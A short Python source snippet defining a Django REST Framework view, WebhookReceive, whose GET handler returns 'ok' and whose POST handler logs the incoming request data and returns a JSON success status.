class WebhookReceive(APIView):

    def get(self, request, *args, **kwargs):
        logger.debug('WebhookReceive')
        return HttpResponse('ok')

    def post(self, request, *args, **kwargs):
        logger.debug('WebhookReceive')
        data = request.data
        logger.debug(data)
        return JsonResponse({'status': 'succes'})
